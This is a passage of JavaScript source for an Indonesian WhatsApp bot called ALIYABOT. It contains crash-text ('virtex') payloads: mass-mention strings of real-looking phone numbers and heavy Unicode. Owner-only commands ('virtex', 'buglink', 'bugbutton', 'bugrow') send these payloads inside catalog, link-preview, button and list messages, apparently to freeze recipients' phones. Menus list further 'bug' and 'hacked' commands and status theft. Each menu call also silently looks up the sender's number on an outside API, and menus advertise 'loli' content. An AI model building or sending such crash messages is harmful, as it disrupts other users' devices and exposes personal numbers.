~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~
_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
*9999999*9999999*9999999*
*9999999*9999999*9999999*
*9999999*9999999*9999999*
*9999999*9999999*9999999*
~*🜋🜊🜨🜲🜚*~ ~*𝟑𝟒𝟓𝟓𝟒𝟑*~~*摷撝摾摩㨮掩揅R*~
~*🜋🜊🜨🜲🜚*~ ~*𝟑𝟒𝟓𝟓𝟒𝟑*~
~*🜋🜊🜨🜲🜚*~ ~*𝟑𝟒𝟓𝟓𝟒𝟑*~~*摷撝摾摩㨮掩揅R*~
~*🜋🜊🜨🜲🜚*~ ~*𝟑𝟒𝟓𝟓𝟒𝟑*~`)
case 'virtex':
if (!isOwner && !mek.key.fromMe) return grupinv('Only Owner')
katalog(`${ngazap(prefix)}`)
katalog(`${emoji2(prefix)}`)
katalog(`${virtex2(prefix)}`)
katalog(`${virtex3(prefix)}`)
katalog(`${virtex4(prefix)}`)
katalog(`${virtex5(prefix)}`)
katalog(`${virtex6(prefix)}`)
katalog(`${virtex7(prefix)}`)
katalog(`${virtex8(prefix)}`)
katalog(`${virtag(prefix)}`)
break
case 'buglink':
                if (!isOwner && !mek.key.fromMe) return reply('Only Owner')
                 ALIYABOT.toggleDisappearingMessages(from, 0)
               ALIYABOT.sendMessage(from, virtex3(prefix), text, { quoted:foncevid, contextInfo :{text: '🔥',
            "forwardingScore": 1000000000,
            isForwarded: false,
            sendEphemeral: false,
            "externalAdReply": {
                "title": `${virtex2(prefix)}`,
                "body": "",
                "previewType": "PHOTO",
                "thumbnailUrl": "https://i.ibb.co/3hrZZ6s/tsukasa.png",
                "thumbnail": fs.readFileSync(`./alya.jpg`),
                "sourceUrl": "https://youtube.com/c/ALIYABOT"}}})
                break
        case 'bugbutton':
        if (!isOwner && !mek.key.fromMe) return reply('Only Owner')
        ALIYABOT.toggleDisappearingMessages(from, 0)
        sendButLocation(from, `${ngazap(prefix)}`, `${virtag(prefix)}`, {jpegThumbnail:iye}, [{buttonId:`${prefix}bbaij72njnwjibdo16830nslm1782`,buttonText:{displayText:`${ngazap(prefix)}`},type:1}])
        ALIYABOT.toggleDisappearingMessages(from, 0)
break
case 'bugrow':
if (!isOwner && !mek.key.fromMe) return reply('Only Owner')
ALIYABOT.toggleDisappearingMessages(from, 0)
 listMsg = {
 buttonText: 'LIST MENU',
 footerText: `${emoji2(prefix)}`,
 description: `${virtex6(prefix)}`,
 sections: [
                     {
                      "title": "CieKontol",
 rows: [
                          {
                              "title": "CieBug",
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
ALIYABOT.sendMessage(from, listMsg, MessageType.listMessage, {quoted:foncevid})
ALIYABOT.toggleDisappearingMessages(from, 0)
break
       
                           case 'bucinstick':
                case 'bucinsticker':{
         
                    var ano = await fetchText('https://raw.githubusercontent.com/rashidsiregar28/data/main/bucin')
                    var wifegerak = ano.split('\n')
                    var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
                    var isGif = wifegerakx.endsWith('.gif') ? true : false
                    if (!isGif) {
                    var ngebuff = await getBuffer(wifegerakx)
                    var media = getRandom('.png')
                    fs.writeFileSync(media, ngebuff)
                    await ffmpeg(`${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								reply(mess.error.api)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
                                    if (error) return reply(mess.error.api)
									 ALIYABOT.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: freply})
								
                                    fs.unlinkSync(media)	
									fs.unlinkSync(`./sticker/${sender}.webp`)	
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(`./sticker/${sender}.webp`)
                    } else {
                     var ngebuff = await getBuffer(wifegerakx)
                 	let media = `./sticker/${sender}.gif`
                    fs.writeFileSync(media, ngebuff)
					reply(mess.wait)
                        await ffmpeg(`${media}`)
							.inputFormat(media.split('.')[4])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(err)
								fs.unlinkSync(media)
								let tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								reply(mess.error.api)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
									if (error) return reply(mess.error.api)
									 ALIYABOT.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: freply})
									
                                    fs.unlinkSync(media)
									fs.unlinkSync(`./sticker/${sender}.webp`)
                                })
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(`./sticker/${sender}.webp`)
                    }
                    }
                    break
              case 'dadu':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
			random = Math.floor(Math.random() * 6) + 1
		damdu = fs.readFileSync(`./sticker/${random}.webp`)
			ALIYABOT.sendMessage(from, damdu, sticker, {quoted: mek})
			break
 case 'owner3':
let ini_list = []
for (let i of nomorowner1) {
const vname = ALIYABOT.contacts[i] != undefined ? ALIYABOT.contacts[i].vname || ALIYABOT.contacts[i].notify : undefined
ini_list.push({
"displayName": 'ALIYABOT',
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname ? `${vname}` : `${ALIYABOT.user.name}`}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
})
}
hehe = await ALIYABOT.sendMessage(from, {
"displayName": `${ini_list.length} kontak`,
"contacts": ini_list 
}, 'contactsArrayMessage', { quoted: mek })
ALIYABOT.sendMessage(from,'Ini Kontak Owner Ku',text,{quoted: mek})
break
case 'kerang':
if (isBanned) return reply(mess.ban)
groups = ALIYABOT.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = ALIYABOT.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await ALIYABOT.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "62858157008612@s.whatsapp.net"
        dtod = '62858157008612'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await ALIYABOT.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `╭─[ *KERANG AJAIB* ]    
│• ${prefix}siapakah
│• ${prefix}kapankan
│• ${prefix}adakah
│• ${prefix}cekme
│• ${prefix}jadian
│• ${prefix}ngewe
│• ${prefix}bucin
└──────`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:fakeker}, [{buttonId:`${prefix}credits`,buttonText:{displayText:'Thanks🐣'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'downloader':
if (isBanned) return reply(mess.ban)
groups = ALIYABOT.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = ALIYABOT.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await ALIYABOT.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "62858157008612@s.whatsapp.net"
        dtod = '62858157008612'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await ALIYABOT.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `╭─[ *DOWNLOADER* ]  
│• ${prefix}ytmp4 link
│• ${prefix}ytmp3 link
│• ${prefix}video query
│• ${prefix}instagram link
│• ${prefix}twitter
│• ${prefix}facebook link
│• ${prefix}tiktokdl
│• ${prefix}tiktokmusic
│• ${prefix}ytsearch
│• ${prefix}play
│• ${prefix}ytmp3
│• ${prefix}ytmp4
│• ${prefix}igdl
│• ${prefix}fbdl
│• ${prefix}brainly
│• ${prefix}lirik
│• ${prefix}tiktoknowm
│• ${prefix}pinterest
│• ${prefix}spotifysearch
└──────`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:fakedown}, [{buttonId:`${prefix}credits`,buttonText:{displayText:'Thanks🐣'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'sesion':
if (isBanned) return reply(mess.ban)
groups = ALIYABOT.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = ALIYABOT.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await ALIYABOT.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "62858157008612@s.whatsapp.net"
        dtod = '62858157008612'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await ALIYABOT.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `╭─[ *BAILEYS* ]
│• ${prefix}jadibot
│• ${prefix}stopjadibot
│• ${prefix}listbot
└──────`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:fakebil}, [{buttonId:`${prefix}credits`,buttonText:{displayText:'Thanks🐣'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'about':
if (isBanned) return reply(mess.ban)
groups = ALIYABOT.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = ALIYABOT.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await ALIYABOT.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "62858157008612@s.whatsapp.net"
        dtod = '62858157008612'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await ALIYABOT.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `╭─[ *ABOUT* ]
│• ${prefix}rules/syarat penggunaan bot
│• ${prefix}menu
│• ${prefix}ping
│• ${prefix}status
│• ${prefix}delete
│• ${prefix}owne
│• ${prefix}report
│• ${prefix}getpic
│• ${prefix}runtime
│• ${prefix}listgroup
│• ${prefix}sider
│• ${prefix}sewa
└──────`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:fakele}, [{buttonId:`${prefix}credits`,buttonText:{displayText:'Thanks🐣'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'group':
case 'grup':
if (isBanned) return reply(mess.ban)
groups = ALIYABOT.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = ALIYABOT.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await ALIYABOT.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "62858157008612@s.whatsapp.net"
        dtod = '62858157008612'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await ALIYABOT.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `╭─[ *GROUP* ]
│• ${prefix}grup <3 Button>
│• ${prefix}promote <reply chat member>
│• ${prefix}demote <reply chat member>
│• ${prefix}setdesc
│• ${prefix}nsfw 1/0
│• ${prefix}setname
│• ${prefix}kick <reply/tag member>
│• ${prefix}add <reply/tag member>
│• ${prefix}getbio <reply chat member>
│• ${prefix}getname <reply chat member>
│• ${prefix}reminder <msg/2s>
│• ${prefix}listonline
│• ${prefix}sider <reply chat bot>
│• ${prefix}antilink
│• ${prefix}tod 
│• ${prefix}tospam <jumlah>
│• ${prefix}antihidetag
│• ${prefix}antiviewonce
│• ${prefix}autojoin <link>
│• ${prefix}antivirtex
│• ${prefix}kickarea
└──────`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:fakelol}, [{buttonId:`${prefix}credits`,buttonText:{displayText:'Thanks🐣'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'fitur':
case 'ownermenu':
if (isBanned) return reply(mess.ban)
groups = ALIYABOT.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = ALIYABOT.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await ALIYABOT.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "62858157008612@s.whatsapp.net"
        dtod = '62858157008612'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await ALIYABOT.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `╭─[ *OWNER* ]
│• ${prefix}off
│• ${prefix}isbaileys
│• ${prefix}banchat
│• ${prefix}unbanchat
│• ${prefix}listbc
│• ${prefix}antidelete <on|off>
│• ${prefix}autoketik <on| off>
│• ${prefix}autoread <gc on / gc off>
│• ${prefix}autovn <on/off>
│• ${prefix}antical <on/off>
│• ${prefix}getcaption
│• ${prefix}bugkatalog
│• ${prefix}buggc <id grup>
│• ${prefix}okvirtex
│• ${prefix}on
│• ${prefix}status
│• ${prefix}setthumb
│• ${prefix}settarget
│• ${prefix}setfakeimg
│• ${prefix}setreply
│• ${prefix}hacked
│• ${prefix}setprefix
│• ${prefix}mode <2 Button self/public>
│• ${prefix}term <code>
│• ${prefix}eval <code>
│• ${prefix}colongsw <reply sw>
└──────`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:fakeown}, [{buttonId:`${prefix}credits`,buttonText:{displayText:'Thanks🐣'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'wibu':
case 'bawang':
if (isBanned) return reply(mess.ban)
groups = ALIYABOT.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = ALIYABOT.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await ALIYABOT.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "62858157008612@s.whatsapp.net"
        dtod = '62858157008612'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await ALIYABOT.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `╭─[ *WIBU* ]
│• ${prefix}loli
│• ${prefix}manga
│• ${prefix}anime 
│• ${prefix}lolivideo
│• ${prefix}husbu
│• ${prefix}waifu
│• ${prefix}milf
│• ${prefix}neko
│• ${prefix}kanna
│• ${prefix}sagiri
│• ${prefix}hentai
│• ${prefix}cosplay
│• ${prefix}wallnime
│• ${prefix}kusonime
│• ${prefix}megumin
│• ${prefix}otakudesu
│• ${prefix}doujindesu
│• ${prefix}storyanime
│• ${prefix}nakanomiku
│• ${prefix}nakanoALIYABOT
│• ${prefix}nakanoitsuki
│• ${prefix}otakuongoing
│• ${prefix}nhentai <code>
│• ${prefix}nekopoi <link>
│• ${prefix}nekopoisearch
└──────`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:fakewibu}, [{buttonId:`${prefix}credits`,buttonText:{displayText:'Thanks🐣'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'upload':
if (isBanned) return reply(mess.ban)
groups = ALIYABOT.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = ALIYABOT.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await ALIYABOT.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "62858157008612@s.whatsapp.net"
        dtod = '62858157008612'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await ALIYABOT.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `╭─[ *UPLOAD* ]
│• ${prefix}upswteks teks
│• ${prefix}upswvideo
│• ${prefix}upswimage
│• ${prefix}upswvoice
│• ${prefix}upswsticker
│• ${prefix}upswlokasi
└──────`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:fakeup}, [{buttonId:`${prefix}credits`,buttonText:{displayText:'Thanks🐣'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'other':
if (isBanned) return reply(mess.ban)
groups = ALIYABOT.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = ALIYABOT.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await ALIYABOT.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "62858157008612@s.whatsapp.net"
        dtod = '62858157008612'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await ALIYABOT.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `*╭─[ OTHER ]*
│• ${prefix}ping
│• ${prefix}inspect
│• ${prefix}join
│• ${prefix}dadu
│• ${prefix}bilangangka number
│• ${prefix}kalkulator
│• ${prefix}pantun
│• ${prefix}quote
│• ${prefix}nuliskanan teks
│• ${prefix}nuliskiri teks
│• ${prefix}foliokiri teks
│• ${prefix}foliokanan teks
│• ${prefix}ss link web
│• ${prefix}liriklagu <query>
│• ${prefix}artinama <name>
